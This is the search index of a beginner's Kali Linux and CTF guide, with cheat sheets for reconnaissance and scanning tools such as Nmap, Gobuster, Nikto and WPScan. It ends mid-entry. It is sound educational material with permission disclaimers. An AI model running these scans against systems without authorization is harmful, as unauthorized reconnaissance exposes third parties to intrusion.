{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#purpose","title":"Purpose","text":"<p>Thank you so much for choosing my free beginner Linux/Kali/Capture the Flag guide! My main goals for this project are to educate beginners about the Linux command line and the basic Kali Linux tools along with having all of your commands in one place with explanations Kali Tools Linux Basics. If you find this useful at all please leave a review! It really means a lot &lt;3</p>"},{"location":"#recommendation","title":"Recommendation","text":"<p>My recommendation for any beginners is to start off with 01-07 of the linux basics because these aren't only command line necessities useful for capture the flags: they are also useful for your everyday lives on your computer. After that, I would go through and learn about all of the Kali tools. These will be useful for capture the flags. To start on CTFs I would use TryHackMe and your own virtual machine. TryHackMe has a lot of really great free labs. I currently have a Macbook Air and my free Kali Linux virtual machine using VMware runs great. It also simulates a real penetration testing environment. </p>"},{"location":"#who-am-i","title":"Who am I?","text":"<p>I am currently a senior in high school. I recently found an interest in the cybersecurity and penetration testing field, and it is something I'll likely pursue during and after college. This was originally for me just to keep notes of things I was learning for capture the flags on TryHackMe. My first capture the flag fried me because I had no experience or knowledge. I'm hoping this resource helps some people either learn or help remember certain commands. If you have any questions on getting your own virtual machine to started or any other general questions please feel free to email me.  nicholasressler512@gmail.com</p>"},{"location":"#disclaimer","title":"Disclaimer","text":"<p>The information provided about Kali tools is intended for educational purposes, such as practicing on Capture The Flag (CTF) challenges or systems you have explicit permission to test. Do not use these tools on unauthorized systems or networks, as doing so is illegal and unethical.</p>"},{"location":"#review","title":"Review","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/DNSenum/","title":"DNSenum","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/DNSenum/#official-documentation-httpswwwkaliorgtoolsdnsenum","title":"Official Documentation: https://www.kali.org/tools/dnsenum/","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/DNSenum/#cheat-sheet-dnsenum-commands","title":"Cheat Sheet:  DNSenum Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/DNSenum/#purpose","title":"Purpose","text":"<p>dnsenum automates DNS enumeration: it finds name servers, MX/SOA records, performs zone transfer checks, and brute-forces subdomains. It\u2019s a fast way to map DNS information for a domain.</p>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/DNSenum/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Discover hidden subdomains (e.g., <code>dev.target.local</code>) that host additional services or flags.  </li> <li>Real world: During reconnaissance for a pentest, map the DNS attack surface to find misconfigurations (e.g., open AXFR) or forgotten hosts.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/DNSenum/#required-info-to-run","title":"Required info to run","text":"<ul> <li>Target domain (e.g., <code>example.com</code>).  </li> <li>Optional wordlist for brute-force (common locations: <code>/usr/share/wordlists/</code> or custom lists).  </li> <li>Optional DNS server override (<code>--dnsserver</code> or <code>--dns</code>) if you want to query a specific resolver.  </li> <li>Network/DNS access (internet access or access to target DNS).  </li> <li>Useful flags:</li> <li><code>-f &lt;wordlist&gt;</code> \u2192 use wordlist for subdomain bruteforce  </li> <li><code>-s &lt;server&gt;</code> \u2192 specify name server(s)  </li> <li><code>-o &lt;file&gt;</code> \u2192 output file prefix  </li> <li><code>--threads &lt;n&gt;</code> \u2192 set concurrency  </li> <li><code>--enum</code> / default checks include NS, MX, SOA, subdomains</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/DNSenum/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic enumeration (default checks NS, MX, SOA, subdomains)\n$ dnsenum example.com\n# Output snippet:\n# [+] Servers: ns1.example.com, ns2.example.com\n# [+] MX: mail.example.com\n# [+] Hosts found: www.example.com, dev.example.com\n\n# Bruteforce subdomains with a wordlist and save output\n$ dnsenum -f /usr/share/wordlists/subdomains-top1million-5000.txt --dnsserver 8.8.8.8 -o dnsenum-example example.com\n# Creates dnsenum-example.* with discovered hosts and records\n\n# Check for zone transfer (AXFR) directly with dig (fallback)\n$ dig @ns1.example.com example.com AXFR\n# If allowed, returns full zone file (rare)\n</code></pre> <p>DNSenum Basics</p> <ul> <li>Zone transfers (AXFR) are rare but a jackpot if allowed; always check with <code>dig</code>.  </li> <li>Keep wordlists updated; bigger lists increase coverage but take longer.  </li> <li>Combine <code>dnsenum</code> output with <code>massdns</code>, <code>subfinder</code>, or <code>amass</code> for higher recall.  </li> <li>Use <code>--dnsserver</code> to avoid rate-limiting by your default resolver.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/DNSenum/#dnsenum-commands","title":"DNSenum Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Gobuster/","title":"Gobuster","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Gobuster/#official-documentation-httpsgithubcomojgobuster","title":"Official Documentation: https://github.com/OJ/gobuster","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Gobuster/#cheat-sheet-gobuster-commands","title":"Cheat Sheet: Gobuster Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Gobuster/#purpose","title":"Purpose","text":"<p>Gobuster is a fast directory and DNS brute-forcing tool written in Go. It discovers hidden directories, files, and subdomains by using wordlists. It\u2019s optimized for speed and concurrency.</p>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Gobuster/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Find hidden web directories (<code>/admin</code>, <code>/backup/secret.txt</code>) or virtual host subdomains used to host challenges.  </li> <li>Real world: Discover forgotten admin panels, backup files, or exposed endpoints before deeper web testing.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Gobuster/#required-info-to-run","title":"Required info to run","text":"<ul> <li>Target URL (e.g., <code>http://example.com</code>) or domain for vhost/subdomain bruteforce.  </li> <li>Wordlist path (e.g., <code>/usr/share/wordlists/dirb/common.txt</code>).  </li> <li>Choose mode:</li> <li><code>dir</code> \u2192 directory/file bruteforce  </li> <li><code>dns</code> \u2192 subdomain bruteforce (requires <code>--wildcard</code> awareness)  </li> <li><code>vhost</code> \u2192 virtual host bruteforce  </li> <li>Useful flags:</li> <li><code>-w &lt;wordlist&gt;</code> \u2192 wordlist file  </li> <li><code>-u &lt;url&gt;</code> \u2192 target URL  </li> <li><code>-t &lt;threads&gt;</code> \u2192 concurrency (default 10)  </li> <li><code>-x &lt;extensions&gt;</code> \u2192 append extensions (e.g., <code>.php, .html</code>)  </li> <li><code>-o &lt;file&gt;</code> \u2192 output file  </li> <li><code>-s &lt;codes&gt;</code> \u2192 show only specific HTTP codes (e.g., <code>200,301,302</code>)</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Gobuster/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic directory brute-force\n$ gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster-dir.txt\n# Output snippet:\n# /admin (Status: 301)\n# /images (Status: 200)\n# /backup.zip (Status: 200)\n\n# Bruteforce with extensions\n$ gobuster dir -u https://example.com -w /usr/share/wordlists/raft-large-directories.txt -x .php,.txt -t 40\n\n# DNS subdomain bruteforce\n$ gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -t 50 -o gobuster-dns.txt\n# Output snippet:\n# dev.example.com\n# test.example.com\n</code></pre> <p>Gobuster Basics</p> <ul> <li>Respect <code>robots.txt</code> and scope in real engagements. Gobuster is noisy.  </li> <li>Use <code>-s</code> to filter only interesting HTTP codes and reduce noise.  </li> <li>Watch for wildcard DNS (false positives); use <code>--wildcard</code> detection or cross-check with <code>dig</code>.  </li> <li>Increase <code>-t</code> for speed but monitor stability and target rate limits.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Gobuster/#gobuster-commands","title":"Gobuster Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Nmap/","title":"Nmap","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Nmap/#official-documentation-httpsnmaporgdocshtml","title":"Official Documentation: https://nmap.org/docs.html","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Nmap/#cheat-sheet-nmap-commands","title":"Cheat Sheet: Nmap Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Nmap/#purpose","title":"Purpose","text":"<p>Nmap (Network Mapper) discovers hosts, open ports, running services and versions, and can perform OS detection and script-based checks. It\u2019s the foundational tool for network reconnaissance.</p>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Nmap/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Map a target VM to find open services (SSH, web, SMB) and versions to guide exploitation.  </li> <li>Real world: Conduct host discovery and service inventory for vulnerability assessment or asset management.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Nmap/#required-info-to-run","title":"Required info to run","text":"<ul> <li>Target IP(s) or hostnames (single, range, CIDR).  </li> <li>Privileges: certain scans (SYN, OS detection) require root (<code>sudo</code>).  </li> <li>Common flags:</li> <li><code>-sS</code> \u2192 SYN scan (stealth)  </li> <li><code>-sV</code> \u2192 service/version detection  </li> <li><code>-O</code>  \u2192 OS detection  </li> <li><code>-A</code>  \u2192 aggressive (scripts, versions, traceroute)  </li> <li><code>-p-</code> \u2192 scan all ports  </li> <li><code>-Pn</code> \u2192 skip host discovery (treat host as up)  </li> <li><code>-sU</code> \u2192 UDP scan  </li> <li><code>-oN/-oX/-oG/-oA</code> \u2192 save outputs  </li> <li><code>-T0..5</code> \u2192 timing template (higher is faster/noisier)</li> <li>Output parsing: use <code>grepable</code> (.gnmap) or XML for automated workflows.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Nmap/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Quick scan of common ports\n$ nmap -T4 -F 192.168.56.101\n# PORT    STATE SERVICE\n# 22/tcp  open  ssh\n# 80/tcp  open  http\n\n# Full SYN scan + service/version detection + default scripts + OS detection, save all outputs\n$ sudo nmap -sS -sV -sC -O -p- -T4 -oA scans/target_full 192.168.56.101\n# Output snippet:\n# 22/tcp   open     ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)\n# 80/tcp   open     http    Apache httpd 2.4.29\n# MAC Address: 08:00:27:1A:2B:3C\n\n# UDP scan example (slow)\n$ sudo nmap -sU -p 53,67,123 192.168.56.101\n</code></pre> <p>Nmap Basics</p> <ul> <li>Use <code>sudo</code> for privileged scans. <code>-sS</code> + <code>-O</code> require root.  </li> <li><code>-p-</code> scans 65535 ports \u2014 use only when necessary. Combine <code>-F</code> or common port lists for speed.  </li> <li>NSE scripts (<code>-sC</code> or <code>--script</code>) can surface useful vuln hints.  </li> <li>Save outputs with <code>-oA</code> for later parsing and reporting.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Nmap/#nmap-commands","title":"Nmap Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Recon-ng/","title":"Recon ng","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Recon-ng/#official-documentation-httpsgithubcomlanmaster53recon-ngwikigetting-started","title":"Official Documentation: https://github.com/lanmaster53/recon-ng/wiki/Getting-Started","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Recon-ng/#cheat-sheet-recon-ng-commands","title":"Cheat Sheet: Recon-ng Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Recon-ng/#purpose","title":"Purpose","text":"<p>Recon-ng is a web reconnaissance framework that organizes the recon workflow into modules, similar to Metasploit for recon. It automates harvesting of data, storing results, and chaining modules.</p>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Recon-ng/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Automate collection of subdomains, contacts, and web assets using multiple modules in a structured way.  </li> <li>Real world: Run multi-source passive recon (APIs, search engines, social footprints) and export structured results for reporting.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Recon-ng/#required-info-to-run","title":"Required info to run","text":"<ul> <li>Python environment and <code>recon-ng</code> installed (often available in Kali).  </li> <li>API keys for certain modules (e.g., Shodan, VirusTotal, Twitter) to increase capability.  </li> <li>Basic workflow:</li> <li><code>workspaces create &lt;name&gt;</code> (optional)  </li> <li><code>modules load &lt;module&gt;</code> </li> <li><code>options set SOURCE &lt;target&gt;</code> and other module options  </li> <li><code>run</code> </li> <li><code>show hosts</code> / <code>show domains</code> / <code>export</code> </li> <li>Key commands:</li> <li><code>marketplace search</code> \u2192 search available modules  </li> <li><code>modules search &lt;term&gt;</code> \u2192 find module by name  </li> <li><code>modules load &lt;recon/hosts-hosts&gt;</code> \u2192 load module  </li> <li><code>options</code> \u2192 list/set module options  </li> <li><code>run</code> \u2192 execute module</li> <li>Examples of useful modules: <code>recon/domains-hosts/bing</code>, <code>recon/domains-contacts/whois_pocs</code>, <code>recon/hosts-hosts/brute_hosts</code>.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Recon-ng/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Start recon-ng\n$ recon-ng\nrecon-ng &gt; workspaces create target_workspace\nrecon-ng &gt; modules load recon/domains-hosts/bing\nrecon-ng &gt; options set SOURCE example.com\nrecon-ng &gt; run\n# Output snippet:\n# [!] Module finished. Hosts saved to the workspace.\nrecon-ng &gt; show hosts\n# id  host\n# 1   www.example.com\n# 2   dev.example.com\n\n# Export hosts to CSV\nrecon-ng &gt; export csv /path/to/output.csv hosts\n</code></pre> <p>Recon-ng Basics</p> <ul> <li>Use API keys for higher-volume sources (set via <code>keys add &lt;service&gt; &lt;key&gt;</code>).  </li> <li>Workspaces keep recon organized \u2014 use them per target.  </li> <li>Recon-ng is passive by default but some modules may be noisier; review module docs.  </li> <li>Export results for ingestion into other tools (Burp, Dradis).</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/Recon-ng/#recon-ng-commands","title":"Recon-ng Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WHOIS/","title":"WHOIS","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WHOIS/#official-documentation-httpswwwkaliorgtoolswhois","title":"Official Documentation: https://www.kali.org/tools/whois/","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WHOIS/#cheat-sheet-whois-commands","title":"Cheat Sheet: WHOIS Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WHOIS/#purpose","title":"Purpose","text":"<p>whois retrieves domain and IP registration information: registrant, registrar, registration/expiry dates, name servers, and contact info (where available).</p>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WHOIS/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Find ownership hints or related domains via registration details or contact emails.  </li> <li>Real world: Verify domain ownership, check for impending expiry (possible takeover risk), or gather points of contact for disclosure.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WHOIS/#required-info-to-run","title":"Required info to run","text":"<ul> <li>A domain name or IP address.  </li> <li>The <code>whois</code> client installed (included in Kali).  </li> <li>Understand that WHOIS data can be privacy-protected; use historical WHOIS or WHOIS APIs if needed.</li> <li>Command options:</li> <li><code>whois &lt;domain&gt;</code> \u2192 basic lookup  </li> <li><code>whois -h &lt;server&gt; &lt;query&gt;</code> \u2192 query a specific WHOIS server (advanced)  </li> <li>For bulk lookups, use APIs (paid) to avoid rate limiting.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WHOIS/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Domain whois\n$ whois example.com\n# Output snippet:\n# Domain Name: EXAMPLE.COM\n# Registrar: RESERVED-Internet Assigned Numbers Authority\n# Creation Date: 1995-08-04T04:00:00Z\n# Name Server: A.IANA-SERVERS.NET\n\n# IP whois (shows allocation/owner)\n$ whois 8.8.8.8\n# Output snippet:\n# NetRange:       8.0.0.0 - 8.127.255.255\n# Organization:   Google LLC\n</code></pre> <p>whois Basics</p> <ul> <li>WHOIS can be rate-limited; space queries. For many domains, contact details are redacted.  </li> <li>For historical records, use services like SecurityTrails, DomainTools, or whoisxmlapi (API keys may be required).  </li> <li>Combine WHOIS with DNS enumeration and <code>theHarvester</code> for fuller recon.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WHOIS/#whois-commands","title":"WHOIS Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WhatWeb/","title":"WhatWeb","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WhatWeb/#official-documentation-httpsgithubcomurbanadventurerwhatweb","title":"Official Documentation: https://github.com/urbanadventurer/WhatWeb","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WhatWeb/#cheat-sheet-whatweb-commands","title":"Cheat Sheet: WhatWeb Commands","text":""},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WhatWeb/#purpose","title":"Purpose","text":"<p>WhatWeb identifies what technologies a website is running (web server, CMS, frameworks, JavaScript libs, analytics). It fingerprints web targets using plugins and signatures.</p>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WhatWeb/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Quickly identify CMS versions (e.g., WordPress) or server types that suggest certain exploit paths.  </li> <li>Real world: Inventory web technologies to plan targeted web tests and detect out-of-date platforms.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WhatWeb/#required-info-to-run","title":"Required info to run","text":"<ul> <li>Target URL (http/https).  </li> <li>Common flags:</li> <li><code>-v</code> / <code>-V</code> \u2192 verbose/version info  </li> <li><code>--plugins</code> \u2192 list or control plugins used  </li> <li><code>-a &lt;level&gt;</code> \u2192 detection aggressiveness (0-3)  </li> <li><code>-U</code> \u2192 custom user-agent  </li> <li><code>-t &lt;num&gt;</code> \u2192 number of threads (parallel scans)  </li> <li><code>-p</code> \u2192 specify plugins  </li> <li><code>-o</code> \u2192 output file</li> <li>No special privileges required. Network access to the target required.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WhatWeb/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic fingerprint\n$ whatweb http://example.com\n# Output snippet:\n# http://example.com [200] Apache[Linux], PHP, X-Powered-By, WordPress[5.6.1], jQuery\n\n# Aggressive scan with verbose output\n$ whatweb -a 3 -v https://example.com -o whatweb.txt\n# Output saved to whatweb.txt\n</code></pre> <p>WhatWeb Basics</p> <ul> <li><code>-a 3</code> increases detection but may be noisier.  </li> <li>Use custom plugins or update signatures frequently for best results.  </li> <li>Combine WhatWeb data with <code>wpscan</code> or manual checks for CMS-specific vulnerabilities.  </li> <li>False positives are possible \u2014 verify findings manually.</li> </ul>"},{"location":"Kali%20Tools/01%20-%20Information%20Gathering/WhatWeb/#whatweb-commands","title":"WhatWeb Commands","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Lynis/","title":"Lynis","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Lynis/#official-documentation-httpscisofycomdocumentationlynis","title":"Official Documentation: https://cisofy.com/documentation/lynis/","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Lynis/#cheat-sheet-lynis-commands","title":"Cheat Sheet: Lynis Commands","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Lynis/#purpose","title":"Purpose","text":"<p>Lynis is an automated security auditing tool for Linux/Unix systems. It scans system configuration, installed software, user accounts, and common security settings to produce hardening suggestions and warnings.</p>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Lynis/#scenarios","title":"Scenarios","text":"<ul> <li>CTF (beginner-friendly): Quick health check of a captured VM to find weak settings (world-writable files, weak SSH configs) that might help escalate.  </li> <li>Real world: Baseline security audit for a server before handover or during a pentest reconnaissance phase to find misconfigurations and missing patches.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Lynis/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Installed from package manager or git (<code>apt install lynis</code> on Kali or <code>git clone https://github.com/CISOfy/lynis.git</code>).  </li> <li>Prefer running as root to get full checks: <code>sudo lynis audit system</code>.  </li> <li>Results saved to <code>/var/log/lynis.log</code> and reports in <code>/var/log/lynis-report.dat</code> (paths printed after a run).  </li> <li>Main modes:</li> <li><code>lynis audit system</code> \u2192 full system audit</li> <li><code>lynis show plugins</code> \u2192 show installed plugins</li> <li><code>lynis update info</code> \u2192 update data files (signature/db)</li> <li>Can be scheduled via cron for regular checks.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Lynis/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Run a full system audit (recommended with sudo)\n$ sudo lynis audit system\n# Sample output snippet:\n# [INFO]  : Starting Lynis 3.0.0\n# [OK]    : Checking operating system and hardware\n# [WARNING]: SSH config: PermitRootLogin is enabled (insecure)\n# [INFO]  : Hardening index : 65 [# of suggestions: 17]\n# Report saved to /var/log/lynis.log\n# Summary saved to /var/log/lynis-report.dat\n\n# Show available tests\n$ lynis show tests\n# Prints list of test categories (authentication, logging, network, etc.)\n\n# Update Lynis data (if applicable)\n$ sudo lynis update info\n# Updates local plugins and tests database\n</code></pre> <p>Lynis Basics</p> <ul> <li>Run Lynis as root for the most complete checks. Non-root runs are limited.  </li> <li>The hardening index is a quick metric (higher = better). Use it to track progress across runs.  </li> <li>Read <code>/var/log/lynis.log</code> for full details and recommendations.  </li> <li>Lynis is an auditing tool \u2014 it reports issues; fixes must be manual and tested.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Lynis/#lynis-commands","title":"Lynis Commands","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Nikto/","title":"Nikto","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Nikto/#official-documentation-httpscirtnetnikto","title":"Official Documentation: https://cirt.net/nikto/","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Nikto/#cheat-sheet-nikto-commands","title":"Cheat Sheet: Nikto Commands","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Nikto/#purpose","title":"Purpose","text":"<p>Nikto is a web server scanner that checks for thousands of known issues (outdated software, insecure files, misconfigurations, default scripts). It\u2019s simple and fast for initial web testing.</p>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Nikto/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Quickly find obvious bad things (default admin pages, exposed backups) on a web server to capture flags.  </li> <li>Real world: Initial external web scan to find low-hanging misconfigurations before deeper manual testing.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Nikto/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Target website URL or IP (<code>http://</code> or <code>https://</code>).  </li> <li>Common flags:</li> <li><code>-h &lt;host&gt;</code> \u2192 host</li> <li><code>-p &lt;port&gt;</code> \u2192 specify port</li> <li><code>-o &lt;file&gt;</code> \u2192 output file</li> <li><code>-Format &lt;format&gt;</code> \u2192 txt, csv, xml</li> <li><code>-Tuning &lt;n&gt;</code> \u2192 tune tests (1-9 categories)</li> <li><code>-evasion &lt;option&gt;</code> \u2192 evade filters (slow/obfuscate)</li> <li>Nikto is noisy \u2014 get permission on real systems. It may generate many requests and false positives.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Nikto/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic scan of a web server\n$ nikto -h http://192.168.56.101\n# Output snippet:\n# + Target IP:          192.168.56.101\n# + Server: Apache/2.4.29 (Ubuntu)\n# + The anti-clickjacking X-Frame-Options header is not present.\n# + /admin/: This might be interesting (HTTP 301)\n# + OSVDB-3092: /backup.zip found (potential sensitive file)\n\n# Save XML report\n$ nikto -h https://example.com -o nikto-report.xml -Format xml\n# Report saved to nikto-report.xml\n</code></pre> <p>Nikto Basics</p> <ul> <li>Nikto finds many low-to-medium issues; verify findings manually to avoid false positives.  </li> <li>Use <code>-Tuning</code> to narrow checks and <code>-evasion</code> carefully if dealing with WAFs.  </li> <li>Combine with <code>WhatWeb</code> and <code>Gobuster</code> for better context.  </li> <li>Don\u2019t run Nikto against targets you do not own or have permission to test.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/Nikto/#nikto-commands","title":"Nikto Commands","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/OpenVas/","title":"OpenVas","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/OpenVas/#official-documentation-httpswwwgreenbonenetendocuments","title":"Official Documentation: https://www.greenbone.net/en/documents/","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/OpenVas/#cheat-sheet-openvas-commands","title":"Cheat Sheet: OpenVas Commands","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/OpenVas/#purpose","title":"Purpose","text":"<p>OpenVAS (now part of Greenbone Vulnerability Management - GVM) is a full-featured vulnerability scanner that runs authenticated and unauthenticated scans, matches CVEs, and produces detailed reports for remediation.</p>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/OpenVas/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: On lab networks you control, run OpenVAS to find known vulnerable services and CVEs you can exploit for practice.  </li> <li>Real world: Comprehensive vulnerability assessment for servers and networks \u2014 ideal for scheduled scans and compliance checks.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/OpenVas/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>OpenVAS/GVM usually runs as a service (server + web UI). Installation on Kali: <code>gvm</code> packages or use <code>apt</code> (package names change frequently). Follow official Greenbone/GVM install docs for latest steps.  </li> <li>Web GUI (Greenbone Security Assistant) typically runs on <code>https://localhost:9392</code> after setup.  </li> <li>Requires:</li> <li>Proper installation &amp; initial setup (feed update \u2014 vulnerability signatures).  </li> <li>For authenticated scans: credentials (SSH, SMB, Windows creds) or agent setup.  </li> <li>Network/firewall access to target hosts.  </li> <li>Typical workflow:</li> <li>Update vulnerability feeds (takes time): <code>gvm-feed-update</code> or via GUI.  </li> <li>Create target (IP or range) and scan config (full, discovery-only, etc.).  </li> <li>Launch scan and monitor progress.  </li> <li>Export reports (PDF, CSV, XML).</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/OpenVas/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Example (service-style) \u2014 check status\n$ sudo systemctl status gvm\n# Output snippet:\n# \u25cf gvm.service - Greenbone Vulnerability Manager\n#    Loaded: loaded (/lib/systemd/system/gvm.service; enabled)\n#    Active: active (running) since ...\n\n# Start feed update (may differ by install)\n$ sudo gvm-feed-update\n# Output snippet:\n# Updating NVTs, CERT, SCAP databases...\n# Feed update finished.\n\n# Using the web UI:\n# 1. Open https://localhost:9392\n# 2. Login with admin credentials\n# 3. Create Target -&gt; Create Task -&gt; Start Task\n# Scan results (GUI) show severity, CVE IDs, and remediation steps.\n</code></pre> <p>OpenVAS / GVM Basics</p> <ul> <li>OpenVAS/GVM setup can be complex and feed updates take time (GBs). Be patient.  </li> <li>Use authenticated scans (with valid creds) for best coverage; unauthenticated scans miss host-level issues.  </li> <li>Installation steps/command names may vary by distro and GVM version \u2014 consult Greenbone docs.  </li> <li>Scans are noisy; get permission and schedule during low-impact windows in production.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/OpenVas/#openvas-gvm-commands","title":"OpenVAS / GVM Commands","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/WPScan/","title":"WPScan","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/WPScan/#official-documentation-httpsgithubcomwpscanteamwpscanwikiwpscan-user-documentation","title":"Official Documentation: https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/WPScan/#cheat-sheet-wpscan-commands","title":"Cheat Sheet: WPScan Commands","text":""},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/WPScan/#purpose","title":"Purpose","text":"<p>WPScan is a WordPress-specific vulnerability scanner that finds plugins, themes, exposed usernames, and known vulnerabilities in WordPress sites.</p>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/WPScan/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Identify vulnerable plugins or default admin pages in a WordPress challenge to find exploitation paths.  </li> <li>Real world: Quickly check a WordPress site for known plugin/theme vulnerabilities and exposures.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/WPScan/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Target URL (WordPress site).  </li> <li>WPScan requires an API token for the WPScan Vulnerability DB for higher rate limits: get a free API token from WPScan (recommended).  </li> <li>Common flags:</li> <li><code>--url &lt;url&gt;</code> \u2192 target</li> <li><code>--enumerate p,t,u</code> \u2192 enumerate plugins (p), themes (t), users (u)</li> <li><code>--api-token &lt;token&gt;</code> \u2192 use API token</li> <li><code>--plugins-detection mixed</code> \u2192 detection mode</li> <li><code>-e vp,vt,tt,ap</code> \u2192 enumerate vulnerable plugins/themes etc. (short forms)</li> <li><code>-o &lt;file&gt;</code> \u2192 save output</li> <li>Some scans (full plugin checks) are noisy \u2014 respect rate limits and permissions.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/WPScan/#example-commands-outputs","title":"Example commands &amp; 